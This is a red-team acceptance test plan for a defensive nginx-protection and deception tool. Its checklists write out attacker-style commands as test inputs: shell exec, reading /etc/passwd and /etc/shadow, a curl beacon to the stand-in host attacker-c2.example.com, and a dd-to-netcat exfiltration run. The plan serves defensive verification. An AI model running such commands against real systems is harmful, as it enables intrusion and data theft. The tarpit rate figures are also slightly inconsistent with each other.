# Red-team Acceptance Suite (P-PS.14)

Two artefacts:

1. **`scenarios_test.go`** — in-process Go scenario tests that wire
   `takeover.Planner` + `decision.Plan` + `response.Executor` +
   `forensic.Store` + `CoEngine` together and verify the
   contract-level expectations of `PROTECTED_SERVICES_TRAP.md §13`
   without requiring a Linux host. Run with:

   ```
   go test -race -count=1 ./tests/redteam/
   ```

2. **This document** — the operator-side manual test plan that
   exercises the kernel-level pieces (seccomp / AppArmor /
   bind-mounts / bpf_override_return / cost-asymmetry timing).
   The in-process tests prove the planner logic; this plan proves
   the kernel hookup.

---

## Prerequisites

- Linux host with kernel ≥ 5.15
- `BPF LSM` enabled (`lsm=...,bpf` on kernel cmdline)
- `apparmor_parser` present (Debian/Ubuntu install includes it)
- `nginx` package installed; service unit at `/lib/systemd/system/nginx.service`
- All 6 xhelix binaries built and on `PATH`:
  - `xhelix`, `xhelixctl`, `xhelix-verify`,
    `xhelix-honeysh`, `xhelix-sinkhole`, `xhelix-dnspoison`
- `/var/lib/xhelix/forensic/` writable by the daemon
- Operator UID has access to the LocalAPI socket

## Setup

1. **Config block** in `/etc/xhelix/xhelix.yaml`:

   ```yaml
   protected_services:
     enabled: true
     services:
       - name: nginx-main
         kind: nginx
         role: reverse_proxy
         unit: nginx.service
         exec_path: /usr/sbin/nginx
         cgroup_prefix: /system.slice/nginx.service
         contract:
           write_roots: ["/var/log/nginx", "/run/nginx", "/var/cache/nginx"]
           upstream_cidrs: ["10.20.0.0/24"]
           strict_read_only: true
         response:
           deception:
             enabled: true
             fake_exec: true
             sinkhole: true
             decoy_fs: true
             poison_dns: true

   forensic_ingest:
     enabled: true
     dir: /var/lib/xhelix/forensic

   takeover:
     active: false              # shadow mode for first round
     tick_interval: 5s
   ```

2. **Install profiles**:
   ```
   # AppArmor (operator-driven complain mode first round)
   sudo xhelixctl protect contract nginx-main > /etc/apparmor.d/xhelix.nginx-main
   sudo apparmor_parser -r /etc/apparmor.d/xhelix.nginx-main

   # Seccomp drop-in
   sudo install -m644 packaging/systemd/nginx-xhelix.conf \
        /etc/systemd/system/nginx.service.d/

   # Honey-sh bind-mount drop-in
   sudo install -m644 /etc/systemd/system/nginx.service.d/xhelix-deception.conf

   sudo systemctl daemon-reload
   sudo systemctl restart xhelix nginx
   ```

3. **Start deception binaries** as side-services or daemons:
   ```
   sudo xhelix-honeysh -log /var/lib/xhelix/forensic/honeysh.jsonl &
   sudo xhelix-sinkhole -http 127.0.0.1:8081 -tls 127.0.0.1:8443 \
        -log /var/lib/xhelix/forensic/sinkhole.jsonl &
   sudo xhelix-dnspoison -udp 127.0.0.1:53 \
        -known-bad /etc/xhelix/known-bad-domains.txt \
        -log /var/lib/xhelix/forensic/dnspoison.jsonl &
   ```

## Acceptance Checklist

### Ring 1 — refusal works

- [ ] **Shell exec refused.** From inside nginx (via SSRF or
      command-injection PoC), attempt `execve("/bin/sh", ...)`.
      In **compliance mode** (deception.fake_exec=false), the
      kernel returns `-EPERM`. In **trap mode**, the bind-mount
      routes to `xhelix-honeysh` and the attacker sees a prompt.
      Either way, `journalctl -u nginx` should NOT show "/bin/sh
      executed in nginx.service".

- [ ] **mprotect RWX refused.** Trigger an exploit primitive that
      calls `mprotect(addr, len, PROT_EXEC|PROT_WRITE)`. seccomp
      should return `-EPERM`; the audit log should record the
      attempt.

- [ ] **ptrace refused.** From nginx, try
      `ptrace(PTRACE_ATTACH, <xhelix-pid>, ...)`. Should return
      `-EPERM`.

- [ ] **Forbidden write refused.** From inside nginx, write to
      `/etc/cron.d/x`. Should return `-EACCES`.

- [ ] **Non-allowlisted connect refused.** From inside nginx,
      `connect()` to an IP outside `upstream_cidrs`. In compliance
      mode: `-ECONNREFUSED`. In trap mode: connection succeeds but
      lands on the sinkhole.

### Ring 2 — trap works (only if deception.* = true)

- [ ] **Honey-sh is responsive.** Attacker types `id`, `whoami`,
      `uname -a`, `ls /`, `cat /etc/passwd`. Each gets plausible
      output. Per-command latency feels like a slow remote shell
      (200ms–800ms).

- [ ] **Decoy shadow.** Attacker types `cat /etc/shadow`. Gets
      yescrypt-style `$y$j9T$...` honey hashes back, NOT the real
      file.

- [ ] **Sinkhole returns 200 OK.** Attacker runs
      `curl http://attacker-c2.example.com/beacon` from inside
      nginx. Returns `200 OK` with sinkhole content; the real C2
      server sees zero callbacks (verify by spinning up a stub
      C2 and observing zero hits).

- [ ] **Forensic JSON-lines populated.** Check that
      `/var/lib/xhelix/forensic/honeysh.jsonl`,
      `sinkhole.jsonl`, `dnspoison.jsonl` are receiving lines
      and that `xhelixctl forensic iocs` returns harvested IOCs.

- [ ] **Suspension within 90s.** After ~90s of attacker activity,
      `xhelixctl protect deception` should show the service
      reaching the Suspended state.

### Ring 3 — containment works (when takeover.active=true)

- [ ] **Score crosses 75 within 90s.** Check `xhelixctl forensic
      iocs --confidence=high` for the trapped session's
      indicators; planner's shadow logs should show a Suspend
      tier being computed.

- [ ] **nginx workers SIGSTOP'd.** Run `ps -eo pid,stat,comm |
      grep nginx`; workers in attacker's lineage show `T`
      (stopped).

- [ ] **Layer-5 IsolateHost requires bastion+mirror.** Set
      `takeover.bastion_available=true` and
      `takeover.off_host_mirror=true`. Re-run scenario, observe
      that score 100 plans now set `isolate_host=true` and
      networking gets blocked except mgmt allow-list.

- [ ] **xhelix-verify validates the chain.** Run
      `./xhelix-verify --chain /var/lib/xhelix/chain --pub
      /var/lib/xhelix/chain.key.pub`. Must report no tampering
      across all the deception events recorded.

### Cost-asymmetry holds

- [ ] **CPU < 5% during sustained deception.** Drive ~10 req/s
      through the honey-shell + sinkhole. `top -p $(pgrep xhelix)`
      should stay below 5% of one core.

- [ ] **Honey-sh latency: 200ms p50, 800ms p99.** Time-bench by
      scripting a sequence of `id; uname; pwd; ls; cat
      /etc/passwd` through netcat against honey-sh's stdin.

- [ ] **Sinkhole latency: 50ms p50, 500ms p99.** Use
      `hey -n 1000 -c 4 http://127.0.0.1:8081/api/check.json`
      and inspect latency distribution.

- [ ] **Tarpit (when enabled) — 1 GB exfil > 30 days.** Compute
      8 bit/s × 30 days = 2.6 MB. So a 1 GB exfil would take
      ~30 years at the configured rate. Operator verifies by
      attempting a `dd if=/dev/zero | nc <tarpitted-ip> 4444`
      and observing < 10 KB/s sustained.

### Compliance escape hatches

- [ ] **Per-service deception disable.** Set
      `protected_services.services[*].response.deception.enabled
      = false` and restart. Forbidden actions now refuse cleanly
      (no honey-shell, no sinkhole). `xhelixctl protect deception`
      shows mode=refuse.

- [ ] **Compliance refusal modes.** All Ring-1 refusals return
      `EACCES`/`EPERM` to the process as in standard SELinux
      hosts — no behaviour that could be construed as deceiving
      the audited process.

- [ ] **Deception evidence retention separate.** Confirm that
      `xhelixctl posture chain` shows separate retention buckets
      for normal evidence vs deception forensic events; a legal
      hold on one doesn't bleed into the other.

---

## Reporting

Operators paste the checked-off boxes and any "fail" notes into the
PR/incident ticket. Failing items are tracked in `ERRORS.md`.

## Honest non-promises

- Some checks (mprotect RWX, ptrace from nginx) require crafting
  a real exploit primitive. Operators without exploit-dev capacity
  can test via standalone proof-of-concept tools
  (e.g. `metasploit` modules in a sandbox).
- "Cost-asymmetry" is measured against the operator's own
  workload. The 5% CPU figure assumes a 1-vCPU host running
  nginx at ~50 req/s normal traffic. Heavier hosts may see lower
  percentages; smaller hosts higher.
- Bind-mount + AppArmor flags=(complain) need an `apparmor_parser
  --version ≥ 3.0` for the modern syntax. Older parsers may
  reject the profile and the operator falls back to enforce-only.
